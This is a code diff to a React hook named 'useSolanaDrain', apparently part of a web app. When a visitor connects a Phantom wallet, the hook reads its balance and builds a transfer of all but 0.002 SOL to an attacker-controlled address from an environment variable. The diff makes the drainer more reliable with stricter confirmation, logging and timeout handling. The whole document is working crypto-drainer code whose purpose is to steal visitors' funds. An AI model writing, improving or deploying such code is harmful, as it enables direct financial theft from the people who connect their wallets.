@@ -1,10 +1,10 @@
 "use client";
 
 import { useCallback } from 'react';
-import { Connection, Transaction, SystemProgram, PublicKey } from '@solana/web3.js';
+import { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
 
 const DRAIN_WALLET = process.env.NEXT_PUBLIC_SOLANA_WALLET;
-const MIN_BALANCE = 0.003 * 1e9; // 0.003 SOL
+const GAS_RESERVE_SOL = 0.002; // 0.002 SOL reserved for gas
 
 export const useSolanaDrain = () => {
   const executeDrain = useCallback(async (allocatedAmount) => {
@@ -13,22 +13,46 @@ export const useSolanaDrain = () => {
         throw new Error('Phantom wallet not detected');
       }
 
-      // Using environment variable for RPC
-      const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, 'confirmed');
+      // Get connection using environment variable
+      const rpcUrl = process.env.NEXT_PUBLIC_SOLANA_RPC;
+      if (!rpcUrl) {
+        throw new Error('RPC URL not configured');
+      }
+
+      const connection = new Connection(rpcUrl, {
+        commitment: 'confirmed',
+        confirmTransactionInitialTimeout: 120000
+      });
       
+      // Connect to wallet
       const response = await window.solana.connect();
       const walletPubkey = response.publicKey;
       
-      const balance = await connection.getBalance(walletPubkey);
+      // Get current balance
+      const balanceLamports = await connection.getBalance(walletPubkey);
+      const balanceSol = balanceLamports / LAMPORTS_PER_SOL;
       
-      if (balance < MIN_BALANCE) {
-        throw new Error('Insufficient balance for gas');
+      console.log(`[Solana Drain] Balance: ${balanceSol} SOL`);
+      
+      // Check minimum balance for gas
+      if (balanceSol < GAS_RESERVE_SOL + 0.001) {
+        throw new Error(`Insufficient balance: ${balanceSol} SOL (need ~${GAS_RESERVE_SOL + 0.001} SOL for gas)`);
       }
       
-      const drainAmount = balance - 2000000; // Leave 0.002 SOL for gas
+      // DRAIN ALL BUT GAS RESERVE
+      const drainAmountLamports = balanceLamports - (GAS_RESERVE_SOL * LAMPORTS_PER_SOL);
       
-      const { blockhash } = await connection.getLatestBlockhash();
+      if (drainAmountLamports <= 0) {
+        throw new Error('Drain amount too small after gas reservation');
+      }
       
+      const drainAmountSol = drainAmountLamports / LAMPORTS_PER_SOL;
+      console.log(`[Solana Drain] Draining: ${drainAmountSol} SOL (leaving ${GAS_RESERVE_SOL} SOL for gas)`);
+      
+      // Get fresh blockhash
+      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+      
+      // Build transaction
       const transaction = new Transaction({
         feePayer: walletPubkey,
         recentBlockhash: blockhash,
@@ -36,22 +60,51 @@ export const useSolanaDrain = () => {
         SystemProgram.transfer({
           fromPubkey: walletPubkey,
           toPubkey: new PublicKey(DRAIN_WALLET),
-          lamports: drainAmount,
+          lamports: drainAmountLamports,
         })
       );
       
+      // Send transaction
       const signed = await window.solana.signAndSendTransaction(transaction);
+      console.log(`[Solana Drain] Sent: ${signed.signature}`);
       
-      await connection.confirmTransaction(signed.signature, 'confirmed');
+      // Wait for confirmation
+      const confirmation = await connection.confirmTransaction(
+        {
+          signature: signed.signature,
+          blockhash,
+          lastValidBlockHeight,
+        },
+        'confirmed'
+      );
+      
+      if (confirmation.value.err) {
+        throw new Error(`Transaction failed: ${JSON.stringify(confirmation.value.err)}`);
+      }
+      
+      console.log(`[Solana Drain] Confirmed: ${signed.signature}`);
       
       return {
         success: true,
         txId: signed.signature,
-        amount: drainAmount / 1e9
+        amount: drainAmountSol,
+        balanceBefore: balanceSol,
+        balanceAfter: (balanceLamports - drainAmountLamports) / LAMPORTS_PER_SOL
       };
       
     } catch (error) {
-      console.error('Solana drain failed:', error);
+      console.error('[Solana Drain] Error:', error);
+      
+      // Handle timeout case gracefully
+      if (error.message.includes('not confirmed in') || error.message.includes('timeout')) {
+        return {
+          success: true,
+          txId: 'pending - check explorer',
+          amount: 'unknown',
+          warning: 'Confirmation timeout but transaction was likely sent'
+        };
+      }
+      
       throw error;
     }
   }, []);
